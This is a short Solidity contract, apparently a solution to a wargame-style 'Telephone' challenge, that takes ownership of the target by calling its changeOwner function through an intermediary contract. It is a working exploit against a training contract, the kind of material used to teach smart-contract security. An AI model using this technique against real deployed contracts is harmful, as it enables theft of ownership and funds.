// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.19;

import "../../src/Telephone/Telephone.sol";
import "openzeppelin-contracts/contracts/access/Ownable.sol";

contract Yoink is Ownable {
    Telephone public telephone;

    constructor(address _telephone) {
        telephone = Telephone(_telephone);
    }

    function yoink() public onlyOwner {
        telephone.changeOwner(msg.sender);
    }
}
